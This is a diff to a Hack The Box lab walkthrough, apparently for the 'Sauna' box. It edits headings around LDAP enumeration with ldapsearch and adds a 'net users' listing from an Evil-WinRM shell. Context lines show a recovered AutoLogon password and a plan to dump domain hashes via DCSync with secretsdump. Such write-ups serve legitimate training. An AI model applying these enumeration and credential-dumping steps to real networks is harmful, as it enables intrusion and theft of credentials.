@@ -107,7 +107,7 @@ Anonymous login successful
 SMB1 disabled -- no workgroup available
 ```
 
-#### LDAP Enumeration:
+#### LDAP Enumeration(Listing available DNs):
 ```shell
 root@kali:~# ldapsearch -x -h 10.10.10.175 -s base namingcontexts
 # extended LDIF
@@ -133,6 +133,8 @@ result: 0 Success
 # numResponses: 2
 # numEntries: 1
 ```
+
+#### LDAP Enumeration(Dumping all branches under EGOTISTICAL-BANK.LOCAL):
 ```shell
 root@kali:~# ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
 # extended LDIF
@@ -178,7 +180,7 @@ At `http://10.10.10.175/about.html#team`, we can find some members of `Egotistic
 ![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-21/2020-07-20-17-22-30.png)
 
 Then, create an user list to enumerate the domain users of `EGOTISTICAL-BANK.LOCAL`.<br>
-We can use [username-anarchy](https://www.hackthebox.eu/) to create an user list.<br>
+We can use [username-anarchy](https://www.hackthebox.eu/) to create the users list.<br>
 At first, we need to list the full name of each members.
 ```shell
 root@kali:~# cat users.txt 
@@ -1147,6 +1149,19 @@ Note we found the AutoLogon credential for `EGOTISTICALBANK\svc_loanmanager`.
     DefaultDomainName             :  EGOTISTICALBANK
     DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
     DefaultPassword               :  Moneymakestheworldgoround!
+```
+
+We don't have the "svc_loanmanager" on the target box. However, we have `svc_loanmgr`.
+```shell
+*Evil-WinRM* PS C:\Users\FSmith\Documents> net users
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            FSmith                   Guest
+HSmith                   krbtgt                   svc_loanmgr
+The command completed with one or more errors.
+
 ```
 
 Since we got the credential for `svc_loanmgr` with DCSync permissions, we can use [secretdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to dump all password hashes.
